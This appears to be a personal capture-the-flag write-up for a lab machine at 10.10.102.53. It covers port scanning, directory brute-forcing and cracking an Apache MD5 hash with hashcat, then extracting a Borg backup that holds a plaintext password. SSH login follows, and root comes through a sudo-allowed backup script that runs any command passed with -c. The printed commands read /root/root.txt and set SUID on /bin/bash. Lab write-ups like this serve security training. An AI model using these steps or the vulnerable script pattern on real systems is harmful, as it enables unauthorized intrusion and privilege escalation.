## Target IP: `10.10.102.53`

---

### Nmap Scan

```bash
sudo nmap -sC -sV -T4 -O 10.10.102.53 -oN results.txt
```

**Open Ports:**

| Port | Service | Version |
| --- | --- | --- |
| 22 | SSH | OpenSSH 7.2p2 |
| 80 | HTTP | Apache httpd 2.4.18 |

---

### Web Enumeration

- Navigated to HTTP page → Apache default page
- Ran directory brute-force:

```bash
gobuster dir -u http://10.10.102.53 -w /usr/share/dirb/wordlists/common.txt
```

**Found Directories:**

- `/admin`
- `/etc`

---

### Exploring `/etc`

- Found file: `passwd`

Contents:

```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

- Ran through hash identifier:
    - Type: Apache MD5 (`$apr1$`, md5apr1)
- Found mode on Hashcat site: **1600**

**Cracked with Hashcat:**

```bash
hashcat.exe -m 1600 -a 0 -o cracked.txt hashes.txt rockyou.txt
```

- Password: `[REDACTED]`

---

### Exploring `/admin`

- Found downloadable file: `archive.tar`

```bash
wget http://10.10.102.53/admin/archive.tar
tar -xvf archive.tar
```

- Extracted contents show nested directories:
    
    ```
    /home/field/dev/final_archive
    ```
    
- Found a `readme` stating it's a Borg archive.

---

### Using Borg

- Installed borg:

```bash
sudo apt install borgbackup
```

- Command:

```bash
borg list final_archive
```

- Prompted for password → used `[REDACTED]` (success)

Output:

```
music_archive Tue, 2020-12-29 09:00:38 [...]
```

- Created mount directory:

```bash
mkdir unpacked
borg mount final_archive unpacked
```

*(This mounts the archive so you can browse it like a normal directory. Didn’t fully understand this step—used writeup guidance.)*

---

### Credential Discovery

- Navigated to:
    
    ```
    unpacked/music_archive/home/alex/Documents
    ```
    
- Found `note.txt`:

```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:[REDACTED]
```

---

### SSH Access

```bash
ssh alex@10.10.102.53
```

- Password: `[REDACTED]`
- Found user flag:

```
flag{[REDACTED]}
```

---

### Privilege Escalation

```bash
sudo -l
```

- Output:

```
(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

- Script is not writable (`nano` confirms this)

**Contents of `backup.sh`:**

```bash
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt

input="/etc/mp3backups/backed_up_files.txt"

while getopts c: flag
do
    case "${flag}" in
        c) command=${OPTARG};;
    esac
done

backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /they/were/many/more"
dest="/etc/mp3backups/"
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

echo "Backing up $backup_files to $dest/$archive_file"
tar czf $dest/$archive_file $backup_files

cmd=$($command)
echo $cmd
```

- The script accepts `c` as an argument and executes it.

**Executed:**

```bash
sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
```

- Returned root flag.
```
flag{[REDACTED]}
```

---

### Notes on Alternate Exploit

- Writeup suggests:

```bash
sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
```

- Didn't work in for me, but worth remembering in case of different configurations.
